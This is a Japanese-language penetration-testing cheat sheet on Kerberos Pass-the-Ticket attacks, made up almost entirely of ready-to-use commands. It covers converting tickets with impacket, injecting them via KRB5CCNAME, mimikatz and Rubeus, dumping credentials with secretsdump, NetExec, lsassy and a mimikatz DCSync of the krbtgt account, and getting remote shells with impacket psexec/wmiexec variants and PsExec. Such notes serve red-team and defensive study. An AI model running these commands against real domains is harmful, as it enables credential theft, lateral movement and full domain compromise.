# Pass The Ticket

`Overpass the hash`、`Silver ticket`、`Golden ticket` 攻撃で偽造したり、取得したチケットを使用してパスワードを使うことなく認証を行うことができる

## チケットを UNIX <-> Windows に変換する

```
# Windows -> Linux
impacket-ticketConverter <TICKET_NAME>.kirbi <TICKET_NAME>.ccache

# Linux -> Windows
impacket-ticketConverter <TICKET_NAME>.ccache <TICKET_NAME>.kirbi
```

## Inject the ticket

### Linux

```
export KRB5CCNAME=<TICKET_NAME>.ccache
```

### Windows

mimikatz

````
kerberos::ptt <TICKET_NAME>
````

Rubeus

```
Rubeus.exe ptt /ticket:<TICKET_FILE>
```

読み込んだチケットの確認をするには `klist` コマンドでできる

## Passing the ticket

- Windowsでは、一度Kerberosチケットが読み込まれると特別な操作なく使用することができる
- Linuxでは、`KRB5CCNAME`変数がいったんエクスポートされると、Kerberos認証をサポートするツールでチケットを使用することができる

### 資格情報の取得

#### Linux

Impacket-Scripts

```
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<Target_IP>
```

NetExec

```
netexec smb <Target_IP> -k --sam
netexec smb <Target_IP> -k --lsa
netexec smb <Target_IP> -k -M lsassy
```

Lsassy

```
lsassy -k <Target_IP>
```

#### Windows

mimikatz

```
lsadump::dcsync /dc:<DC_IP> /domain:<DOMAIN> /user:krbtgt
```

### Shellの取得・コマンド実行

#### Linux

impacket-scripts

```
impacket-psexec -k <DOMAIN>/<USERNAME>@<Target_IP>
impacket-smbexec -k <DOMAIN>/<USERNAME>@<Target_IP>
impacket-wmiexec -k <DOMAIN>/<USERNAME>@<Target_IP>
impacket-atexec -k <DOMAIN>/<USERNAME>@<Target_IP>
impacket-dcomexec -k <DOMAIN>/<USERNAME>@<Target_IP>
```

NetExec

```
netexec winrm <Target_IP> -k -x whoami
netexec smb <Target_IP> -k -x whoami
```

#### Windows

```
.\PsExec.exe -accepteula \\<Target_IP> cmd
```

